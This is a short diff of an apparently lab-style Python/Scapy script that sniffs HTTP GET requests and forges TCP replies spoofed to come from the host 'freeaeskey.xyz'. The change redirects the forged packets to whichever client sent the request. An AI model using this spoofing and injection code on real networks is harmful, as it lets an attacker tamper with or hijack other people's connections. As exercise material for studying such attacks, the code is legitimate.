@@ -10,7 +10,6 @@ knownKey = b'4d6167696320576f7264733a2053717565616d697368204f7373696672616765'
 # Resolve the target hostname to an IP address
 targetHost = "freeaeskey.xyz"
 targetIP = socket.gethostbyname(targetHost)
-myIP = b'172.18.210.34'
 
 # Request Strings
 getRequest = b"GET / HTTP/1.1"
@@ -29,7 +28,7 @@ def handle_pkt(pkt):
         if getRequest in bytes(packet[TCP].payload):
 
             # Create the IP layer
-            ipLayer = IP(src=targetIP, dst=myIP)
+            ipLayer = IP(src=targetIP, dst=packet[IP].src)
             tcpLayer = TCP(
                         sport=packet[TCP].dport,
                         dport=packet[TCP].sport,
